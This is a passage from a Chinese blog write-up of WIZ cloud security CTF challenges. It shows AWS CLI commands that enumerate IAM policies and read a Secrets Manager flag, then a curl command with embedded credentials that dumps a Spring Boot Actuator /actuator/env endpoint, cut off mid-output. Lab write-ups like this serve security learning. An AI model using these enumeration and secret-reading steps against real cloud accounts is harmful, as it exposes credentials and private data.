class="punctuation">,</span></span><br><span class="line">                        <span class="string">&quot;iam:ListAttachedRolePolicies&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="string">&quot;iam:GetPolicy&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="string">&quot;iam:GetPolicyVersion&quot;</span></span><br><span class="line">                    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;VersionId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;v1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;IsDefaultVersion&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;CreateDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-09-22T12:49:46+00:00&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<p>然后使用engineering角色的权限(即前文的newlouise用户)来列出 bob 所附加的 IAM 策略。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yliken@LAPTOP-40PQI58C:~/.cloudfox/cached-data/aws/770926735562$ aws --profile newlouise iam list-attached-user-policies --user-name bob</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;AttachedPolicies&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;PolicyName&quot;</span>: <span class="string">&quot;ReadSecretsManager&quot;</span>,</span><br><span class="line">            <span class="string">&quot;PolicyArn&quot;</span>: <span class="string">&quot;arn:aws:iam::770926735562:policy/ReadSecretsManager&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">yliken@LAPTOP<span class="number">-40</span>PQI58C<span class="punctuation">:</span>~/.cloudfox/cached-data/aws/<span class="number">770926735562</span>$ aws --profile newlouise iam get-policy-version --policy-arn arn<span class="punctuation">:</span>aws<span class="punctuation">:</span>iam<span class="punctuation">:</span><span class="punctuation">:</span><span class="number">770926735562</span><span class="punctuation">:</span>policy/ReadSecretsManager --version-id v1</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;PolicyVersion&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Document&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                        <span class="string">&quot;secretsmanager:ListSecrets&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="string">&quot;secretsmanager:GetSecretValue&quot;</span></span><br><span class="line">                    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Sid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AllowReadSecretsManager&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;VersionId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;v1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;IsDefaultVersion&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;CreateDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-09-22T12:49:44+00:00&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后使用bob的身份列出secret</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">yliken@LAPTOP-40PQI58C:~/.cloudfox/cached-data/aws/770926735562$ aws --profile bob secretsmanager list-secrets</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;SecretList&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;ARN&quot;</span>: <span class="string">&quot;arn:aws:secretsmanager:us-west-2:770926735562:secret:flag_1cd5667c10d8-UFJuzO&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Name&quot;</span>: <span class="string">&quot;flag_1cd5667c10d8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Description&quot;</span>: <span class="string">&quot;Congratulations! You found the flag!&quot;</span>,</span><br><span class="line">            <span class="string">&quot;LastChangedDate&quot;</span>: <span class="string">&quot;2025-09-22T20:49:45.064000+08:00&quot;</span>,</span><br><span class="line">            <span class="string">&quot;LastAccessedDate&quot;</span>: <span class="string">&quot;2025-09-22T08:00:00+08:00&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SecretVersionsToStages&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;terraform-20250922124944990700000005&quot;</span>: [</span><br><span class="line">                    <span class="string">&quot;AWSCURRENT&quot;</span></span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;CreatedDate&quot;</span>: <span class="string">&quot;2025-09-22T20:49:44.697000+08:00&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用bob的权限查看sercet</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">yliken@LAPTOP<span class="number">-40</span>PQI58C<span class="punctuation">:</span>~/.cloudfox/cached-data/aws/<span class="number">770926735562</span>$ aws --profile bob secretsmanager get-secret-value --secret-id flag_1cd5667c10d8</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;ARN&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:secretsmanager:us-west-2:770926735562:secret:flag_1cd5667c10d8-UFJuzO&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;flag_1cd5667c10d8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;VersionId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;terraform-20250922124944990700000005&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;SecretString&quot;</span><span class="punctuation">:</span> <span class="string">&quot;a0055b44f3f9e27665fbfccadfd17a9c&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;VersionStages&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;AWSCURRENT&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;CreatedDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-09-22T20:49:45.060000+08:00&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509240000469.png" alt="Abuse OpenID Connect and GitLab for AWS Access "></p>
<h2 id="WIZ云安全锦标赛-Perimeter-Leak"><a href="#WIZ云安全锦标赛-Perimeter-Leak" class="headerlink" title="WIZ云安全锦标赛-Perimeter Leak"></a>WIZ云安全锦标赛-Perimeter Leak</h2><h3 id="Spring-Boot-Actuator端点"><a href="#Spring-Boot-Actuator端点" class="headerlink" title="Spring Boot Actuator端点"></a>Spring Boot Actuator端点</h3><p>最开始在env里面找到了一条消息, 有一个spring boot站点</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509230106354.png" alt="image-20250923010643272"></p>
<p>目录扫描一下,<code>/actuator</code> 系列是 <strong>Spring Boot Actuator</strong> 的端点</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509230112215.png" alt="image-20250923011218139"></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br></pre></td><td class="code"><pre><span class="line">yliken@LAPTOP<span class="number">-40</span>PQI58C<span class="punctuation">:</span>/mnt/c/Users/legion$ curl https<span class="punctuation">:</span><span class="comment">//ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/env|jq .</span></span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line"><span class="number">100</span>  <span class="number">5059</span>    <span class="number">0</span>  <span class="number">5059</span>    <span class="number">0</span>     <span class="number">0</span>    <span class="number">388</span>      <span class="number">0</span> --<span class="punctuation">:</span>--<span class="punctuation">:</span>--  <span class="number">0</span><span class="punctuation">:</span><span class="number">00</span><span class="punctuation">:</span><span class="number">13</span> --<span class="punctuation">:</span>--<span class="punctuation">:</span>--  <span class="number">1163</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;activeProfiles&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;defaultProfiles&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;default&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;propertySources&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;server.ports&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;local.server.port&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">8080</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;servletContextInitParams&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;systemProperties&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;java.specification.version&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;24&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sun.jnu.encoding&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.class.path&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/ec2-user/spring-boot/target/spring-boot-0.0.1-SNAPSHOT.jar&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.vm.vendor&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Amazon.com Inc.&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sun.arch.data.model&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;64&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.vendor.url&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://aws.amazon.com/corretto/&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;catalina.useNaming&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;false&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;user.timezone&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTC&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.vm.specification.version&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;24&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;os.name&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Linux&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;APPLICATION_NAME&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;spring&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sun.java.launcher&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SUN_STANDARD&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sun.boot.library.path&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/usr/lib/jvm/java-24-amazon-corretto.x86_64/lib&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sun.java.command&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/ec2-user/spring-boot/target/spring-boot-0.0.1-SNAPSHOT.jar&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;jdk.debug&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;release&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sun.cpu.endian&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;little&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;user.home&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/ec2-user&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;user.language&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;en&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.specification.vendor&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Oracle Corporation&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.version.date&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-04-15&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.home&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/usr/lib/jvm/java-24-amazon-corretto.x86_64&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;file.separator&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.vm.compressedOopsMode&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;32-bit&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;line.separator&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.vm.specification.vendor&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Oracle Corporation&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.specification.name&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Java Platform API Specification&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;FILE_LOG_CHARSET&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.awt.headless&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;java.protocol.handler.pkgs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.boot.loader.net.protocol&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sun.management.compiler&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;value&quot;</span><span 